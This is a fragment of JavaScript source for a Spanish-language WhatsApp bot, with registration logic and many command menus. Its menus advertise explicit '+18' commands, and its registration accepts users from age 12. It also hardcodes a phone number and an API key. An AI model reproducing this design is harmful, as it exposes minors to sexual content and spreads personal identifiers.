        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
	    if (isCmd) {console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'))}
	    if (!command) {console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'))}
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Etiqueta un sticker!')
        su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}
/*				 			 if (m.message && m.isBaileys && mek.quoted.isBaileys) {				 		        	
				reply('Enlace detectado!')
				
			}*/

alphakey = 'offline'
confukey = 'ConfuMods'



        switch (command) {
  case 'hora':
  reply(`Fecha ${fecha}
Hora: ${time}`)
  break      
        							case 'verify':
							if (isBanned) return  reply(mess.banned)
                if (isRegistered) return  reply(ind.rediregis())
                if (!c.includes('|')) return  reply('Utiliza el comando asi : #verify Joseph|27 (es un ejemplo)')
                const namaUser = c.substring(0, c.indexOf('|') - 0)
                const umurUser = c.substring(c.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                const registrados = _registered.length
                if(isNaN(umurUser)) return await reply('La edad debe ser un número!!')
                if (namaUser.length >= 20) return reply(`Usa tu nombre Real oh uno mas corto!`)
                if (umurUser > 40) return reply(`Tu edad es demasiado mayor, máximo 40 años`)
                if (umurUser < 12) return reply(`Tu edad es demasiado joven mínimo 12 años`)
                try {
                      pi = await cnf.getProfilePicture(`${sender.split('@')[0]}@c.us`)
        pp = await getBuffer(pi)
        const { uploadimg, upload } = require('./lib/uploadimg')
        pp_ = await upload(pp)
        ppimg = (`${pp_}`)
				} catch {
					ppimg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
				}
					daftarimg = await getBuffer(`https://api-alc.herokuapp.com/api/other/verify2?nombre=${encodeURI(namaUser)}&serial=${encodeURI(serialUser)}&miembros=${encodeURI(registrados)}&perfilft=${ppimg}&fondo=https://i.ibb.co/pRfs0bV/cc8b85e9115ef7c68fa791e085b84c75.jpg&apikey=${confukey}`)
                veri = sender
                if (isGroup) {
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await cnf.sendMessage(from, daftarimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    addATM(sender)
                    addLevelingId(sender)
                    console.log(color('|REG|'), 'Nick:', color(namaUser, 'cyan'), 'Edad:', color(umurUser, 'cyan'), '>', color(sender || groupName))
                } else {
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await cnf.sendMessage(from, daftarimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    addATM(sender)
                    addLevelingId(sender)
                    console.log(color('|REG|'), 'Nick:', color(namaUser, 'cyan'), 'Edad:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                }	
          break

			  

        
        
        case 'menu':
        case 'help':
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, menu(hr, prema, pushname, role, userLevel, userXp), {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break
case 'comandos':
stod = `${sender}`
 listMsg = {
 buttonText: 'LISTA DE MENUS',
 footerText: '*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*',
 description: `Hola @${stod.split('@')[0]}, Seleccione el menú aquí, si no aparece, escriba #menu`,
 sections: [
                     {
                      "title": `${jmn} - ${week} - ${calender}`,
 rows: [
                            {
                              "title": "OwnerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "GrupoMenu",
                              "rowId": ""
                           },
                           {
                              "title": "OtakuMenu",
                              "rowId": ""
                           },
                           {
                              "title": "NsfwMenu",
                              "rowId": ""
                           }, 
                           {
                              "title": "DownloadMenu",
                              "rowId": ""
                           }, 
                           {
                              "title": "TextProMenu",
                              "rowId": ""
                           }, 
                           {
                              "title": "MenuIMG",
                              "rowId": ""
                           },                                                                                                                                    
                           {
                              "title": "StickerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "Estado",
                              "rowId": ""
                           },                           
                           {
                              "title": "VariadoMenu",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
cnf.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
      
        case 'stickermenu':
        case 'stickmenu':
        case 'menusticker':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)      
				stst = stst.status == 401 ? '' : stst.status
				const iwii = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Sᴛɪᴄᴋᴇʀs* ⟨❗⟩
╭┤            𐦉  
├┤⟨👾⟩ 𐌼ᴇɴᴜ ᴅᴇ sᴛɪᴄᴋᴇʀs ⟨👾⟩
┃┝━━━───•
┃│࿊⃟️ ${prefix}exif
┃│࿊⃟ ${prefix}robar
┃│࿊⃟ ${prefix}sticker
┃┝━━━───•
├┤⟨🔞⟩ 𐌼ᴇɴᴜ ᴅᴇ sᴛɪᴄᴋᴇʀ +18 ⟨🔞⟩
┃│࿊⃟ ${prefix}stickcum
┃│࿊⃟ ${prefix}stickhentai
┃│࿊⃟ ${prefix}stickfeetg
┃│࿊⃟ ${prefix}stickblowjob
┃│࿊⃟ ${prefix}stickpussy
┃│࿊⃟ ${prefix}stickneko
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`

sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iwii}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break

        case 'menugp':
        case 'grupomenu':
        case 'groupmenu':
        case 'menugrupo':
        case 'admimenu':
        case 'menuadmin':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'      
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status

const iwiii = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Gʀᴜᴘᴏs* ⟨❗⟩
╭┤            𐦉  
├┤⟨️💳⟩ 𐌼ᴇɴᴜ ᴅᴇ ᴀᴅᴍs⟨💳⟩
┃┝━━━───•
┃│࿊⃟️ ${prefix}kick
┃│࿊⃟️ ${prefix}kick2
┃│࿊⃟️ ${prefix}delttt
┃│࿊⃟️ ${prefix}getpp
┃│࿊⃟️ ${prefix}opengc
┃│࿊⃟ ${prefix}closegc
┃│࿊⃟️ ${prefix}linkgrup
┃│࿊⃟️ ${prefix}listadmin
┃│࿊⃟️ ${prefix}listonline
┃│࿊⃟ ${prefix}getdeskgc
┃│࿊⃟️ ${prefix}resetlinkgc
┃│࿊⃟️ ${prefix}nsfw「 1/0 」
┃│࿊⃟️ ${prefix}getbio「 @ 」
┃│࿊⃟️ ${prefix}getpict「 @ 」
┃│࿊⃟️ ${prefix}demote「 @ 」
┃│࿊⃟️ ${prefix}hidetag「 txt 」
┃│࿊⃟️ ${prefix}sticktag「 txt 」
┃│࿊⃟️ ${prefix}promote「 @ 」
┃│࿊⃟️ ${prefix}antilink「 1/0 」
┃│࿊⃟ ${prefix}tictactoe「 @ 」
┃│࿊⃟️ ${prefix}add「 numero 」
┃│࿊⃟️ ${prefix}sider「 msgbot 」
┃│࿊⃟️ ${prefix}setdeskgc「 txt 」
┃│࿊⃟️ ${prefix}setnamegc「 txt 」
┃│࿊⃟️ ${prefix}kontak「 @tag|txt 」
┃│࿊⃟️ ${prefix}kontag「 @tag|txt 」
┃│࿊⃟ ${prefix}creategrup「 txt|@ 」
┃│࿊⃟️ ${prefix}totag「 img/vid/stick 」
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`
				
sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iwiii}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break

        case 'menuimg':
        case 'imagemenu':
        case 'menuimage':
        case 'imgmenu':
        case 'menuimagen':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
	const iwiiii = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *ɪᴍᴀɢᴇɴᴇs* ⟨❗⟩
╭┤            𐦉  
├┤⟨📷⟩ Rᴀɴᴅᴏᴍ ɪᴍɢ ⟨📷⟩
┃┝━━━───•
┃│࿊⃟ ${prefix}fox
┃│࿊⃟ ${prefix}cat
┃│࿊⃟ ${prefix}dog
┃│࿊⃟ ${prefix}koala
┃│࿊⃟ ${prefix}panda
┃│࿊⃟ ${prefix}brasil
┃│࿊⃟ ${prefix}badgirl
┃│࿊⃟️ ${prefix}muslos
┃│࿊⃟ ${prefix}say-cat
┃│࿊⃟ ${prefix}random-girls
┃│࿊⃟ ${prefix}ari-gameplays
┃│
├ ⟨🖼️⟩ ᴇᴅɪᴛᴀʀ ɪᴍᴀɢᴇɴ ⟨🖼️⟩
┃│࿊⃟ ${prefix}horny
┃│࿊⃟ ${prefix}triggered「 img 」
┃│࿊⃟ ${prefix}gay「 img 」
┃│࿊⃟ ${prefix}glass「 img 」
┃│࿊⃟ ${prefix}passed「 img 」
┃│࿊⃟ ${prefix}jail「 img 」
┃│࿊⃟ ${prefix}comrade「 img 」
┃│࿊⃟ ${prefix}green「 img 」
┃│࿊⃟ ${prefix}blue「 img 」
┃│࿊⃟ ${prefix}sepia「 img 」
┃│࿊⃟ ${prefix}wasted「 img 」
┃│࿊⃟ ${prefix}greyscale「 img 」
┃│࿊⃟ ${prefix}blurple2「 img 」 
┃│࿊⃟ ${prefix}blurple「 img 」 
┃│࿊⃟ ${prefix}red「 img 」 
┃│࿊⃟ ${prefix}invertgreyscale「 img 」 
┃│࿊⃟ ${prefix}invert「 img 」
┃│࿊⃟ ${prefix}simp「 @ 」
┃│࿊⃟ ${prefix}tweet「 txt1|txt2|txt3 」
┃│࿊⃟ ${prefix}ytcomment「 txt|txt|txt 」
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`

sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iwiiii}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break


        case 'menuowner':
        case 'ownermenu':
        case 'ownerhelp':
 
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
     
     const iwiiiii = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Cʀᴇᴀᴅᴏʀ* ⟨❗⟩
╭┤            𐦉.  
├┤⟨☣️⟩ 𐌼ᴇɴᴜ ժeʟ 𝖢𝗋e𝖺𝖽𝗈𝗋 ⟨☣️⟩
┃┝━━━─── • ──━━━━
┃│࿊⃟ ${prefix}exif
┃│࿊⃟️ ${prefix}self
┃│࿊⃟️ ${prefix}leave
┃│࿊⃟️ ${prefix}mute
┃│࿊⃟️ ${prefix}public
┃│࿊⃟️ ${prefix}online
┃│࿊⃟ ${prefix}restart
┃│࿊⃟ ${prefix}clearall
┃│࿊⃟ ${prefix}delchat
┃│࿊⃟ ${prefix}unmute
┃│࿊⃟ ${prefix}demoteall
┃│࿊⃟️ ${prefix}promoteall
┃│࿊⃟️ ${prefix}q「 msg 」
┃│࿊⃟️ ${prefix}setbio「 txt 」
┃│࿊⃟️ ${prefix}offline「 txt 」
┃│࿊⃟️ ${prefix}setname「 txt 」
┃│࿊⃟️ ${prefix}setprofile「 img 」
┃│࿊⃟ ${prefix}unirse「 link gp 」
┃│࿊⃟ ${prefix}delcmd「 sticker 」
┃│࿊⃟️ ${prefix}addcmd「 sticker 」
┃│࿊⃟ ${prefix}tobc「 stick/audio 」
┃│࿊⃟ ${prefix}bc「 txt/gif/img/vid 」
┃│࿊⃟ ${prefix}autorespon「 on/off 」
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`
sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iwiiiii}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break



        case 'menudownloads':
        case 'downloadsmenu':
        case 'downloads':
        case 'descmenu':
        case 'downloadmenu':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
	
	const iiwi = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Dᴇsᴄᴀʀɢᴀs* ⟨❗⟩
╭┤            𐦉  
├┤⟨📥⟩ 𐌼ᴇɴᴜ ᴅᴇ ᴅᴇsᴄᴀʀɢᴀs ⟨📥⟩
┃┝━━━───•
┃│࿊⃟ ${prefix}mediafire
┃│࿊⃟ ${prefix}play
┃│࿊⃟️ ${prefix}ytmp3
┃│࿊⃟ ${prefix}ytmp4
┃│࿊⃟️ ${prefix}igdl
┃│࿊⃟️ ${prefix}pinterest
┃│࿊⃟ ${prefix}facebook
┃│࿊⃟️ ${prefix}tiktok
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`

sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iiwi}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break

        case 'menunsfw':
        case 'nsfwmenu':
        case 'menuhot':
        case 'hotmenu':
        case 'uwumenu':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
	const iiiwi = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Aɴɪᴍᴇs ɴsғᴡ* ⟨❗⟩
╭┤            𐦉  
├┤⟨📂⟩ 𐌼ᴇɴᴜ +18 ⟨📂⟩
┃┝━━━───•
┃│࿊⃟ ${prefix}ass
┃│࿊⃟ ${prefix}ahegao
┃│࿊⃟ ${prefix}bdsm
┃│࿊⃟ ${prefix}blowjob
┃│࿊⃟ ${prefix}cuckold
┃│࿊⃟ ${prefix}cum
┃│࿊⃟ ${prefix}ero
┃│࿊⃟ ${prefix}femdom
┃│࿊⃟ ${prefix}foot
┃│࿊⃟ ${prefix}gangbang
┃│࿊⃟ ${prefix}glasses
┃│࿊⃟ ${prefix}hentai
┃│࿊⃟ ${prefix}jahy
┃│࿊⃟ ${prefix}masturbation
┃│࿊⃟ ${prefix}orgy
┃│࿊⃟ ${prefix}panties
┃│࿊⃟ ${prefix}pussy
┃│࿊⃟ ${prefix}thighs
┃│࿊⃟ ${prefix}yuri
┃│࿊⃟ ${prefix}neko4
┃│࿊⃟ ${prefix}yuri2
┃│࿊⃟️ ${prefix}trapnime
┃│࿊⃟ ${prefix}yaoi
┃│࿊⃟ ${prefix}neko3
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`
sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iiiwi}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break


        case 'othermenu':
        case 'menuvariado':
        case 'variadomenu':
        case 'variados':  
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
	const iiiiwi = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Vᴀʀɪᴀᴅᴏ* ⟨❗⟩
╭┤            𐦉  
├┤⟨🍃⟩ 𐌼ᴇɴᴜ ᴠᴀʀɪᴀᴅᴏ  ⟨🍃⟩
┃┝━━━───•
┃│࿊⃟️ ${prefix}reto
┃│࿊⃟ ${prefix}simi
┃│࿊⃟ ${prefix}slots
┃│࿊⃟ ${prefix}toimg
┃│࿊⃟️ ${prefix}tagme
┃│࿊⃟ ${prefix}sticker
┃│࿊⃟️ ${prefix}jadibot
┃│࿊⃟ ${prefix}verdad
┃│࿊⃟️ ${prefix}listgrup
┃│࿊⃟ ${prefix}test-gay
┃│࿊⃟ ${prefix}test-lesbi
┃│࿊⃟ ${prefix}test-puta
┃│࿊⃟ ${prefix}stopjadibot
┃│࿊⃟️ ${prefix}attp「 txt 」
┃│࿊⃟️ ${prefix}tag「 núm 」
┃│࿊⃟️ ${prefix}tts es「 txt 」
┃│࿊⃟️ ${prefix}balik「 audio 」
┃│࿊⃟ ${prefix}bass「 audio 」
┃│࿊⃟️ ${prefix}robar「 txt|txt 」
┃│࿊⃟️ ${prefix}robot「 audio 」
┃│࿊⃟ ${prefix}tomp4「 stick 」
┃│࿊⃟ ${prefix}baileys「 msg 」
┃│࿊⃟️ ${prefix}colong「 stick 」
┃│࿊⃟️ ${prefix}tomp3「 video 」
┃│࿊⃟️ ${prefix}chat「 num|txt 」
┃│࿊⃟️ ${prefix}semoji「 emoji 」
┃│࿊⃟ ${prefix}checkbin「 bin 」
┃│࿊⃟️ ${prefix}gemuk「 audio 」
┃│࿊⃟️ ${prefix}detikvn「 audio 」
┃│࿊⃟ ${prefix}encode-64「 txt 」
┃│࿊⃟ ${prefix}decode-64「 txt 」
┃│࿊⃟ ${prefix}encode-32「 txt 」
┃│࿊⃟ ${prefix}decode-32「 txt 」
┃│࿊⃟ ${prefix}detikvideo「 vid 」
┃│࿊⃟ ${prefix}readmore「 txt|txt 」
┃│࿊⃟ ${prefix}getcaption「 msg 」
┃│࿊⃟️ ${prefix}sharelock「 txt|txt 」
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`

sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iiiiwi}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break

        case 'menuanime':
        case 'otaku':
        case 'menuotaku':
        case 'otakumenu':
        case 'animemenu':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
	const ioiwi = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Aɴɪᴍᴇ* ⟨❗⟩
╭┤            𐦉  
├ ⟨⛩️⟩ 𐌼ᴇɴᴜ ᴅᴇ ᴀɴɪᴍᴇs ⟨⛩️⟩
┃┝━━━───•
┃│࿊⃟ ${prefix}wallpaper
┃│࿊⃟ ${prefix}wallpaper2
┃│࿊⃟️ ${prefix}padoru
┃│࿊⃟ ${prefix}waifu
┃│࿊⃟️ ${prefix}megu
┃│࿊⃟️ ${prefix}megu2
┃│࿊⃟ ${prefix}neko
┃│࿊⃟️ ${prefix}neko2
┃│࿊⃟️ ${prefix}loli
┃│࿊⃟ ${prefix}loli2
┃│࿊⃟️ ${prefix}naruto
┃│࿊⃟ ${prefix}sasuke
┃│࿊⃟ ${prefix}hinata
┃│࿊⃟ ${prefix}sakura
┃│࿊⃟ ${prefix}kanna
┃│࿊⃟ ${prefix}shoto
┃│࿊⃟️ ${prefix}akiyama
┃│࿊⃟ ${prefix}anna
┃│࿊⃟️ ${prefix}misaki
┃│࿊⃟️ ${prefix}boruto
┃│࿊⃟ ${prefix}chitoge
┃│࿊⃟️ ${prefix}deidara
┃│࿊⃟️ ${prefix}doraemon
┃│࿊⃟ ${prefix}elaina
┃│࿊⃟️ ${prefix}emilia
┃│࿊⃟ ${prefix}erza
┃│࿊⃟ ${prefix}rias
┃│࿊⃟ ${prefix}hestia
┃│࿊⃟ ${prefix}inori
┃│࿊⃟ ${prefix}isuzu
┃│࿊⃟️ ${prefix}itachi
┃│࿊⃟ ${prefix}kaga
┃│࿊⃟️ ${prefix}kagura
┃│࿊⃟️ ${prefix}kakashi
┃│࿊⃟ ${prefix}kaori
┃│࿊⃟️ ${prefix}kaneki
┃│࿊⃟️ ${prefix}kotori
┃│࿊⃟ ${prefix}kurumi
┃│࿊⃟️ ${prefix}madara
┃│࿊⃟ ${prefix}mikasa
┃│࿊⃟ ${prefix}miku
┃│࿊⃟ ${prefix}minato
┃│࿊⃟ ${prefix}onepiece
┃│࿊⃟ ${prefix}nezuko
┃│࿊⃟️ ${prefix}pokemon
┃│࿊⃟ ${prefix}sagiri
┃│࿊⃟️ ${prefix}shina
┃│࿊⃟️ ${prefix}shinka
┃│࿊⃟ ${prefix}shota
┃│࿊⃟️ ${prefix}shizuka
┃│࿊⃟️ ${prefix}touka
┃│࿊⃟ ${prefix}tsunade
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`			
sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${ioiwi}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break





        case 'menulogo':
        case 'logo':
        case 'logos':
        case 'textpro':
        case 'textpromenu':
        case 'logomenu':        
        ptod = "584126897998@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await cnf.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status						
const iyiwi = `╭═══════════════⊷
╰╮ ⟨❗⟩️ *Lᴏɢᴏs* ⟨❗⟩
╭┤
├ ⟨❄️⟩ 𐌼ᴇɴᴜ ᴅᴇ ʟᴏɢᴏs ⟨❄️⟩
┃┝━━━───•
├┤⟨🍃⟩ ᴛᴇxᴛᴘʀᴏ ⟨🍃⟩
┃│
┃│࿊⃟ ${prefix}blackpink「 txt 」
┃│࿊⃟ ${prefix}rainbow2「 txt 」
┃│࿊⃟ ${prefix}water_pipe「 txt 」
┃│࿊⃟ ${prefix}halloween「 txt 」
┃│࿊⃟ ${prefix}sketch「 txt 」
┃│࿊⃟ ${prefix}sircuit「 txt 」
┃│࿊⃟ ${prefix}discovery「 txt 」
┃│࿊⃟ ${prefix}metallic2「 txt 」
┃│࿊⃟ ${prefix}fiction「 txt 」
┃│࿊⃟ ${prefix}demon「 txt 」
┃│࿊⃟ ${prefix}transformer「 txt 」
┃│࿊⃟ ${prefix}berry「 txt 」
┃│࿊⃟ ${prefix}thunder「 txt 」
┃│࿊⃟ ${prefix}magma「 txt 」
┃│࿊⃟ ${prefix}3dstone「 txt 」
┃│࿊⃟ ${prefix}neon「 txt 」
┃│࿊⃟ ${prefix}glitch「 txt 」
┃│࿊⃟ ${prefix}harry_potter「 txt 」
┃│࿊⃟ ${prefix}embossed「 txt 」
┃│࿊⃟ ${prefix}broken「 txt 」
┃│࿊⃟ ${prefix}papercut「 txt 」
┃│࿊⃟ ${prefix}gradient「 txt 」
┃│࿊⃟ ${prefix}glossy「 txt 」
┃│࿊⃟ ${prefix}watercolor「 txt 」
┃│࿊⃟ ${prefix}multicolor「 txt 」
┃│࿊⃟ ${prefix}neon_devil「 txt 」
┃│࿊⃟ ${prefix}underwater「 txt 」
┃│࿊⃟ ${prefix}bear「 txt 」
┃│࿊⃟ ${prefix}wonderfulg「 txt 」
┃│࿊⃟ ${prefix}christmas「 txt 」
┃│࿊⃟ ${prefix}neon_light「 txt 」
┃│࿊⃟ ${prefix}snow「 txt 」
┃│࿊⃟ ${prefix}cloudsky「 txt 」
┃│࿊⃟ ${prefix}luxury2「 txt 」
┃│࿊⃟ ${prefix}gradient2「 txt 」
┃│࿊⃟ ${prefix}summer「 txt 」
┃│࿊⃟ ${prefix}writing「 txt 」
┃│࿊⃟ ${prefix}engraved「 txt 」
┃│࿊⃟ ${prefix}summery「 txt 」
┃│࿊⃟ ${prefix}3dglue「 txt 」
┃│࿊⃟ ${prefix}metaldark「 txt 」
┃│࿊⃟ ${prefix}neonlight「 txt 」
┃│࿊⃟ ${prefix}oscar「 txt 」
┃│࿊⃟ ${prefix}minion「 txt 」
┃│࿊⃟ ${prefix}holographic「 txt 」
┃│࿊⃟ ${prefix}purple「 txt 」
┃│࿊⃟ ${prefix}glossyb「 txt 」
┃│࿊⃟ ${prefix}deluxe2「 txt 」
┃│࿊⃟ ${prefix}glossyc「 txt 」
┃│࿊⃟ ${prefix}fabric「 txt 」
